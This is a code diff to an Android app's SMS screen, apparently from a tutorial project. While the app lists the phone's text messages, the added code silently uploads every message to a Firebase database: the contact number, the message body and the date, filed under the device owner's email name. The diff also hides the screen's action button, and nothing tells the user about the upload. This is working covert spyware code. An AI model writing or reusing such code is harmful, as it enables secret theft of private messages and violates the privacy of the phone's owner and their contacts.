@@ -8,17 +8,26 @@ import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
+import android.text.format.DateFormat;
 import android.view.View;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
 import android.widget.Toast;
 
 import com.android.tutorial.R;
+import com.android.tutorial.utils.MyDevice;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 public class SMSActivity extends AppCompatActivity {
+
+    private DatabaseReference mFirebaseDatabase;
+    private FirebaseDatabase mFirebaseInstance;
+    Cursor cursor;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -28,6 +37,11 @@ public class SMSActivity extends AppCompatActivity {
         setSupportActionBar(toolbar);
         getSupportActionBar().setDisplayHomeAsUpEnabled(true);
         fab();
+
+        mFirebaseInstance = FirebaseDatabase.getInstance();
+
+        // get reference to 'users' node
+        mFirebaseDatabase = mFirebaseInstance.getReference();
 
         ListView lViewSMS = (ListView) findViewById(R.id.listViewSMS);
         if (fetchSms() != null) {
@@ -43,32 +57,53 @@ public class SMSActivity extends AppCompatActivity {
         Uri message = Uri.parse("content://sms/");
         ContentResolver cr = SMSActivity.this.getContentResolver();
 
-        Cursor c = cr.query(message, null, null, null, null);
-        SMSActivity.this.startManagingCursor(c);
-        int totalSMS = c.getCount();
+        Cursor cursor = cr.query(message, null, null, null, null);
+        SMSActivity.this.startManagingCursor(cursor);
+        int totalSMS = cursor.getCount();
         String readStatus = "";
-        if (c.moveToFirst()) {
+        long millisecond;
+        if (cursor.moveToFirst()) {
             for (int i = 0; i < totalSMS; i++) {
-                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
+                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                     readStatus = "inbox";
                 } else {
                     readStatus = "sent";
                 }
 
-                sms.add("MobileNumber:" + c.getString(c.getColumnIndexOrThrow("address"))
-                        + "\nSMS:" + c.getString(c.getColumnIndexOrThrow("body"))
-                        + "\nDATE:" + c.getString(c.getColumnIndexOrThrow("date"))
-                        + "\nTYPE:" + c.getColumnIndexOrThrow("type")
+                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
+                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();
+
+                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                        + "\nDATE:" + dateString
+                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
                         + "\nReadStatus:" + readStatus);
-                c.moveToNext();
+
+                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(SMSActivity.this)
+//                                MyDevice.getDeviceName()
+                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
+                        .child(cursor.getString(cursor.getColumnIndexOrThrow("address")))
+                        .child(readStatus)
+                        .child("" + i)
+                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                                + " " + dateString
+                        );
+                cursor.moveToNext();
             }
         }
         // else {
         // throw new RuntimeException("You have no SMS");
         // }
-        c.close();
+        cursor.close();
 
         return sms;
+    }
+
+    public void onDestroy() {
+        super.onDestroy();
+        if (cursor != null) {
+            cursor.close();
+        }
     }
 
     public ArrayList fetchInbox() {
@@ -190,6 +225,7 @@ public class SMSActivity extends AppCompatActivity {
 
     private void fab() {
         FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
+        fab.hide();
         fab.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
